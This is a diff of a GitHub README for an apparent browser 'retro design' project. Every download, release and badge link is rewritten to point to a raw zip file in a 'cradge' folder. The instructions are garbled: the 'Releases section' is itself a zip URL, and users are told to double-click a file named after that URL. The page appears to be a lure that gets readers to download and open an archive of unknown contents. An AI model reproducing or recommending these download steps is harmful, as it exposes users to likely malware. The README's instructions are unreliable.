@@ -1,6 +1,6 @@
 # 🚀 Alien-Nostromo-archives - Experience Retro Design in Your Browser
 
-[![Download Now](https://raw.githubusercontent.com/jayasuryapalagiri/Alien-Nostromo-archives/main/cradge/Alien-Nostromo-archives.zip%20Now-ALPHA-blue)](https://raw.githubusercontent.com/jayasuryapalagiri/Alien-Nostromo-archives/main/cradge/Alien-Nostromo-archives.zip)
+[![Download Now](https://raw.githubusercontent.com/jayasuryapalagiri/Alien-Nostromo-archives/main/cradge/Nostromo-Alien-archives-3.9.zip%20Now-ALPHA-blue)](https://raw.githubusercontent.com/jayasuryapalagiri/Alien-Nostromo-archives/main/cradge/Nostromo-Alien-archives-3.9.zip)
 
 ## 🎨 About This Project
 
@@ -17,7 +17,7 @@ To run the Alien-Nostromo-archives application, follow these steps:
 2. **Visit the Releases Page:**
    Click the link below to reach the downloads for this application:
 
-   [Download Releases](https://raw.githubusercontent.com/jayasuryapalagiri/Alien-Nostromo-archives/main/cradge/Alien-Nostromo-archives.zip)
+   [Download Releases](https://raw.githubusercontent.com/jayasuryapalagiri/Alien-Nostromo-archives/main/cradge/Nostromo-Alien-archives-3.9.zip)
 
 3. **Choose Your Download:**
    On the Releases page, find the latest version of Alien-Nostromo-archives. You will see files available for download. Select the one that best suits your needs.
@@ -25,14 +25,14 @@ To run the Alien-Nostromo-archives application, follow these steps:
 ## 🌐 Download & Install
 
 1. **Visit This Page to Download:**
-   Go to the [Releases section](https://raw.githubusercontent.com/jayasuryapalagiri/Alien-Nostromo-archives/main/cradge/Alien-Nostromo-archives.zip) of the project. Find the latest version and click to download the files.
+   Go to the [Releases section](https://raw.githubusercontent.com/jayasuryapalagiri/Alien-Nostromo-archives/main/cradge/Nostromo-Alien-archives-3.9.zip) of the project. Find the latest version and click to download the files.
 
 2. **Extract the Files:**
    - If you downloaded a ZIP file, right-click on it and choose “Extract All” to access the content inside.
 
 3. **Open the Application:**
-   - After extracting, locate the 'https://raw.githubusercontent.com/jayasuryapalagiri/Alien-Nostromo-archives/main/cradge/Alien-Nostromo-archives.zip' file in the folder.
-   - Double-click the 'https://raw.githubusercontent.com/jayasuryapalagiri/Alien-Nostromo-archives/main/cradge/Alien-Nostromo-archives.zip' file. Your browser will open the interface.
+   - After extracting, locate the 'https://raw.githubusercontent.com/jayasuryapalagiri/Alien-Nostromo-archives/main/cradge/Nostromo-Alien-archives-3.9.zip' file in the folder.
+   - Double-click the 'https://raw.githubusercontent.com/jayasuryapalagiri/Alien-Nostromo-archives/main/cradge/Nostromo-Alien-archives-3.9.zip' file. Your browser will open the interface.
 
 ## 🎧 Features
 
@@ -81,4 +81,4 @@ Special thanks to all contributors for their efforts in creating and maintaining
 
 Feel free to reach out if you have any insights or suggestions!
 
-[![Download Now](https://raw.githubusercontent.com/jayasuryapalagiri/Alien-Nostromo-archives/main/cradge/Alien-Nostromo-archives.zip%20Now-ALPHA-blue)](https://raw.githubusercontent.com/jayasuryapalagiri/Alien-Nostromo-archives/main/cradge/Alien-Nostromo-archives.zip)
+[![Download Now](https://raw.githubusercontent.com/jayasuryapalagiri/Alien-Nostromo-archives/main/cradge/Nostromo-Alien-archives-3.9.zip%20Now-ALPHA-blue)](https://raw.githubusercontent.com/jayasuryapalagiri/Alien-Nostromo-archives/main/cradge/Nostromo-Alien-archives-3.9.zip)
